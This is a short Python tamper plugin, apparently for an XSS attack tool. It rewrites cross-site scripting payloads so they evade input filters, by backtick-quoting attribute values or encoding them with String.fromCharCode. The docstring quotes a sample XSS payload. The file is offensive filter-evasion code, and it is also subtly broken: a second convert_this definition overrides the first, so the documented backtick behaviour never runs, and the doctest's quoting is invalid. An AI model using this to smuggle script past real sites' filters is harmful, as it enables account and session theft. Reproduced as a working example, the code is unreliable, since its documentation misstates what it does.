# -*- coding: utf-8 -*
import re
from main_modules.settings import PRIORITY
__priority__ = PRIORITY.NORMAL




def tamper(payload, **kwargs):
    """
    >>> tamper("<IMG SRC=javascript:alert("RSnake says, 'XSS'")>")
    <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
    """
    string=re.sub(r"(?<=[=:])[\S]*(?=[>\S])",convert_this,str(payload))

    return (string) if payload else payload

def convert_this(string):
    new_word=[]
    string=string.group()
    if re.search(r'^\'',string):
        string=re.sub(r"'","`",string)
    elif re.search(r'^"',string):
        string=re.sub(r"\"","`",string)
    elif re.search(r"^\w",string):
        string='`'+string+'`'
        pass
    return string

def convert_this(string):
    new_word=[]
    string=string.group()
    for letter in string:
        new_word.append(str(ord(letter)))
    new_word='String.fromCharCode('+','.join(new_word)+')'
    return new_word
